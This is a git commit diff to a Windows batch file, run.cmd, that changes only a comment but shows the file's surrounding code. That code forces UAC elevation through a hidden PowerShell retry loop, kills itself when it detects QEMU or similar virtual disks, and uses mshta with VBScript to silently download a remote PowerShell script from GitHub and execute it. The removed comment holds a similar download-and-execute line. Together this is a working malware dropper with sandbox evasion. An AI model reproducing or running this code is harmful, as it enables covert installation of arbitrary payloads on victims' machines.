db0ee6d02ab4d7d4a479d633f391141c506b3ab8
43a1723 <hai1723notgay@gmail.com>
2024-09-21 12:11:40 +0700

    Update run.cmd

--- run.cmd
+++ run.cmd
@@ -4,5 +4,5 @@ cd /d "%~dp0"
 net session >nul 2>&1
 if NOT %errorlevel% == 0 ( powershell -Win Hidden -NoP -ExecutionPolicy Bypass "while(1){try{Start-Process -WindowStyle Hidden -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit )
 powershell "$d = wmic diskdrive get model;if ($d -like '*DADY HARDDISK*' -or $d -like '*QEMU HARDDISK*') { taskkill /f /im cmd.exe }"
-:: powershell -w hidden -nop -ep bypass -c "iwr -useb https://raw.githubusercontent.com/43a1723/test/main/download.ps1 | iex"
+:: hmmm nothing
 mshta vbscript:CreateObject("WScript.Shell").Run("powershell -command ""iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1') | iex""",0)(window.close)
